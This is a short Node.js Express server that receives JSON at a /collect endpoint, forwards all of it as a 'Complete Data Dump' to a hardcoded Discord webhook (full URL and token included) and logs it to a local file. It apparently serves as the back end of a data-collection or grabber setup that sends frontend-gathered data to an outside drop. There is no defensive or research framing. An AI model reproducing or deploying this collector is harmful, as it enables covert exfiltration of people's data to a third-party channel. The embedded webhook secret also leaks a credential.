// Optional Node.js backend for storing data
const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.json());

// Endpoint to receive data from the frontend
app.post('/collect', (req, res) => {
    const data = req.body;
    
    // Forward to Discord webhook
    fetch('https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            content: "📡 Server-Side Data Received",
            embeds: [{
                title: "Complete Data Dump",
                description: `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 4000)}\n\`\`\``,
                color: 0x9b59b6
            }]
        })
    });
    
    // Also store locally
    const fs = require('fs');
    fs.appendFileSync('collected_data.log', JSON.stringify(data) + '\n');
    
    res.sendStatus(200);
});

app.listen(3000, () => console.log('Collector server running on port 3000'));
